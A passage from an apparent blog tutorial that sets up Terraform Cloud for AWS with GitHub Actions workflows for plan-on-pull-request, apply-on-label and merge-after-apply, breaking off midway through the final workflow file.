<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cd</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">root</span></span></code></pre></div>
<p>Now create a <code>1-providers.tf</code>:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="hcl" data-theme="default"><code data-language="hcl" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">terraform</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">cloud</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">    organization</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"sontek"</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">workspaces</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">      name</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"root"</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">  }</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">required_providers</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">    aws</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">      source  </span><span style="color: #F47067">=</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"hashicorp/aws"</span></span>
<span data-line=""><span style="color: #ADBAC7">      version </span><span style="color: #F47067">=</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"4.58.0"</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">    tfe</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">      source  </span><span style="color: #F47067">=</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"hashicorp/tfe"</span></span>
<span data-line=""><span style="color: #ADBAC7">      version </span><span style="color: #F47067">=</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"0.42.0"</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">  }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">provider</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"aws"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  region</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"us-east-1"</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">default_tags</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">    tags</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">      Owner   </span><span style="color: #F47067">=</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"john@sontek.net"</span></span>
<span data-line=""><span style="color: #ADBAC7">      Env     </span><span style="color: #F47067">=</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"Root"</span></span>
<span data-line=""><span style="color: #ADBAC7">      Service </span><span style="color: #F47067">=</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"BusinessOperations"</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">  }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p><strong>NOTE</strong>: You should replace <code>organization</code>, <code>workspaces.name</code>, and
<code>tags.Owner</code> to be your own values.</p>
<p>Now create a small resource to prove everything is working, we'll use SQS for
this. Create a file called <code>2-sqs.tf</code>:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="hcl" data-theme="default"><code data-language="hcl" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">resource</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"aws_sqs_queue"</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"example-sqs"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  name</span><span style="color: #F69D50">                        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"example-sqs"</span></span>
<span data-line=""><span style="color: #ADBAC7">  message_retention_seconds</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #6CB6FF">86400</span></span>
<span data-line=""><span style="color: #ADBAC7">  receive_wait_time_seconds</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #6CB6FF">10</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>If you run the plan you should see the resource it wants to create:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">terraform</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">init</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">terraform</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">plan</span></span>
<span data-line=""> </span></code></pre></div>
<p>and you should see the run is executing in terraform cloud:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">Running plan in Terraform Cloud. Output will stream here. Pressing Ctrl-C</span></span>
<span data-line=""><span style="color: #adbac7">will stop streaming the logs, but will not stop the plan running remotely.</span></span></code></pre></div>
<p>You can click the link it provides to see the logs. Now lets apply this
resource to see it all working:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">❯ terraform apply</span></span></code></pre></div>
<p>You should get a response like:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">Apply complete! Resources: 1 added, 0 changed, 0 destroyed.</span></span></code></pre></div>
<p>So Terraform Cloud has full access to create AWS resources!   The final step
is to get github running the plan/apply on pull requests. Commit these files
to your repository and we'll remove them in a pull request. Create a
<code>.gitignore</code> file in the root:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">.terraform*</span></span></code></pre></div>
<p>and commit all the files:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">git</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">add</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">*</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">git</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">commit</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-m</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"initial infra"</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">git</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">push</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">origin</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">head</span></span></code></pre></div>
<h1>Github Actions</h1>
<p>The two most popular workflows when using terraform are:</p>
<ul>
<li>
<p><strong>Apply after Merge</strong>: This is the default for things like
<a href="https://terraform.io">terraform cloud</a> and most github actions.</p>
</li>
<li>
<p><strong>Apply before Merge</strong>: This is the default for things like
<a href="https://www.runatlantis.io/">Atlantis</a>.</p>
</li>
</ul>
<p>I don't like apply-after-merge.  There are a lot of ways where a <code>plan</code>
can succeed but an <code>apply</code> will fail and you end up with broken configuration
in <code>main</code>.</p>
<p>So in this article I'll show you how to implement <strong>apply-before-merge</strong> with
github actions.</p>
<p>All of these changes will be in the <code>infra</code> repository that was generated from
<code>bootstrap</code>.  We are done with the bootstrap at this point.</p>
<p>First, lets setup the <code>.github</code> folder, the end result we want is:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">.github/</span></span>
<span data-line=""><span style="color: #F69D50">└──</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">workflows</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">├──</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">on-apply-finished.yml</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">├──</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">on-pull-request-labeled.yml</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">└──</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">on-pull-request.yml</span></span></code></pre></div>
<p>So create the folders:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">mkdir</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-p</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">.github/workflows</span></span></code></pre></div>
<h1>On Pull Request</h1>
<p>The first flow we'll create is the <code>terraform plan</code> workflow which should be
ran whenever a pull request is opened. Create the file
<code>.github/workflows/on-pull-request.yml</code> and put this content in it:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="yml" data-theme="default"><code data-language="yml" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #8DDB8C">name</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">pr_build</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #6CB6FF">on</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">pull_request</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">branches</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #96D0FF">main</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #8DDB8C">env</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">TERRAFORM_CLOUD_TOKENS</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">app.terraform.io=${{ secrets.TFE_TOKEN }}</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">GITHUB_TOKEN</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">${{ secrets.GITHUB_TOKEN }}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #8DDB8C">jobs</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">terraform_validate</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">runs-on</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">ubuntu-22.04</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">strategy</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">fail-fast</span><span style="color: #ADBAC7">: </span><span style="color: #6CB6FF">false</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">matrix</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">folder</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">          - </span><span style="color: #96D0FF">root</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">steps</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">name</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">Checkout</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">uses</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">actions/checkout@v3</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">name</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">terraform validate</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">uses</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">dflook/terraform-validate@v1</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">with</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">          </span><span style="color: #8DDB8C">path</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">${{ matrix.folder }}</span></span>
<span data-line=""><span style="color: #ADBAC7">          </span><span style="color: #8DDB8C">workspace</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">${{ matrix.folder }}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">terraform_fmt</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">runs-on</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">ubuntu-22.04</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">strategy</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">fail-fast</span><span style="color: #ADBAC7">: </span><span style="color: #6CB6FF">false</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">matrix</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">folder</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">          - </span><span style="color: #96D0FF">root</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">steps</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">uses</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">actions/checkout@v3</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">name</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">terraform fmt</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">uses</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">dflook/terraform-fmt-check@v1</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">with</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">          </span><span style="color: #8DDB8C">path</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">${{ matrix.folder }}</span></span>
<span data-line=""><span style="color: #ADBAC7">          </span><span style="color: #8DDB8C">workspace</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">${{ matrix.folder }}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">terraform_plan</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">runs-on</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">ubuntu-22.04</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">permissions</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">contents</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">read</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">pull-requests</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">write</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">strategy</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">fail-fast</span><span style="color: #ADBAC7">: </span><span style="color: #6CB6FF">false</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">matrix</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">folder</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">          - </span><span style="color: #96D0FF">root</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">steps</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">uses</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">actions/checkout@v3</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">name</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">terraform plan</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">uses</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">dflook/terraform-plan@v1</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">with</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">          </span><span style="color: #8DDB8C">path</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">${{ matrix.folder }}</span></span>
<span data-line=""><span style="color: #ADBAC7">          </span><span style="color: #8DDB8C">workspace</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">${{ matrix.folder }}</span></span></code></pre></div>
<p>This creates three jobs:</p>
<ul>
<li><strong>terraform_validate</strong>: This validates the terraform via <code>terraform validate</code>
command to make sure that it is correct and doesn't have duplicate resources
or anything like that.</li>
<li><strong>terraform_fmt</strong>: This verifies that the terraform is well formatted by
running the <code>terraform fmt</code> command.`</li>
<li><strong>terraform_plan</strong>: This runs the <code>terraform</code> plan and comments on the PR a
diff of the changes for you to verify.</li>
</ul>
<p>To verify this is working, lets delete <code>root/2-sqs.tf</code>, then lets push a branch
and make a pull request to see the result so far:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">rm</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">root/2-sqs.tf</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">git</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">add</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">.github/</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">root/</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">git</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">checkout</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-b</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">apply-before-merge</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">git</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">commit</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-m</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"Implemented on-pull-request"</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">git</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">push</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">origin</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">head</span></span></code></pre></div>
<p>After you make the pull request you should 3 checks on it and a comment that
shows the plan:</p>
<center>
<img src="/images/posts/aws_apply_before_merge/github_comment.png" width="400">
<img src="/images/posts/aws_apply_before_merge/github_checks.png" width="400">
</center>
<h1>Apply on Label</h1>
<p>So now that the plan is working we need some way to <code>apply</code> the changes. I've
found the best way to do this is via a label rather than a comment because of
the way github actions work. Their event based actions like <code>on-comment</code> aren't
executed in the context of a pull-request.</p>
<p>Since we will be using a label to signal a plan is ready to be applied lets
create a new file <code>.github/workflows/on-pull-request-labeled.yml</code> and provide
this content:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="yaml" data-theme="default"><code data-language="yaml" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #8DDB8C">name</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">pr_apply</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #6CB6FF">on</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">pull_request</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">types</span><span style="color: #ADBAC7">: [ </span><span style="color: #96D0FF">labeled</span><span style="color: #ADBAC7"> ]</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #8DDB8C">env</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">TERRAFORM_CLOUD_TOKENS</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">app.terraform.io=${{ secrets.TFE_TOKEN }}</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">GITHUB_TOKEN</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">${{ secrets.GITHUB_TOKEN }}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #8DDB8C">jobs</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">terraform_apply</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">if</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">${{ github.event.label.name == 'tfc-apply' }}</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">runs-on</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">ubuntu-22.04</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">permissions</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">contents</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">read</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">pull-requests</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">write</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">strategy</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">fail-fast</span><span style="color: #ADBAC7">: </span><span style="color: #6CB6FF">false</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">matrix</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">folder</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">          - </span><span style="color: #96D0FF">root</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">steps</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">uses</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">actions/checkout@v3</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">uses</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">dflook/terraform-apply@v1</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">with</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">          </span><span style="color: #8DDB8C">path</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">${{ matrix.folder }}</span></span>
<span data-line=""><span style="color: #ADBAC7">          </span><span style="color: #8DDB8C">workspace</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">${{ matrix.folder }}</span></span></code></pre></div>
<p>This will fire whenever a pull request is labeled with the <code>tfc-apply</code> label.
You will need to create this label for the repository.</p>
<p>It will run the <code>apply</code> and update the previous plan comment to let you
know the status.</p>
<center>
<img src="/images/posts/aws_apply_before_merge/tfc_applying.png" width="400">
<img src="/images/posts/aws_apply_before_merge/tfc_applying_comment.png" width="400">
</center>
<h1>Merge on Apply</h1>
<p>One thing you'll notice is that the pull request stayed open even after the
infrastructure is applied and we don't want that. We want any changes that have
made it into the environment to be merged into <code>main</code> automatically. To do
this we'll create our final action.</p>
<p>Create a new file <code>.github/workflows/on-apply-finished.yml</code> with this content:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="yaml" data-theme="default"><code data-language="yaml" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #8DDB8C">name</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">pr_merge</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #768390"># Only trigger, when the build workflow succeeded</span></span>
<span data-line=""><span style="color: #6CB6FF">on</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">workflow_run</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">workflows</span><span style="color: #ADBAC7">: [</span><span style="color: #96D0FF">pr_apply</span><span style="color: #ADBAC7">]</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">types</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #96D0FF">completed</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #8DDB8C">jobs</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">merge</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">if</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">${{ github.event.workflow_run.conclusion == 'success' }}</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">runs-on</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">ubuntu-22.04</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">permissions</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">contents</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">write</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">pull-requests</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">write</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">checks</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">read</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">statuses</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">read</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">actions</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">read</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">outputs</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">pullRequestNumber</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">${{ steps.workflow-run-info.outputs.pullRequestNumber }}</span></span>
